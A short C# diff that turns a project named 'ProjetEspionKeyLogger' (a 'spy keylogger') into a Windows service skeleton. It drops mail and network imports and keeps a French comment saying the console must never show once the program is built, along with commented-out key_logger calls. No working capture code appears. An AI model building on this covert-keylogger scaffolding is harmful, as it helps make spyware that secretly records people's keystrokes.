@@ -1,18 +1,19 @@
 ﻿using System;
-using System.Diagnostics;
-using System.Net.Mail;
-using System.IO;
-using System.Net;
+using System.Collections.Generic;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
 
-namespace ProjetEspionKeyLogger
+namespace ProjetKeyLogger
 {
-    class Program
+    static class Program
     {
-
-        static void Main(string[] args)
+        /// <summary>
+        /// Point d'entrée principal de l'application.
+        /// </summary>
+        static void Main()
         {
-
-            Console.hide
             //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
             //Console.WriteLine("Hello World!");
             /*
@@ -36,7 +37,5 @@ namespace ProjetEspionKeyLogger
             //key_logger.CreateTestMessage2();
             //Console.WriteLine("FIN!");
         }
-
-
     }
 }
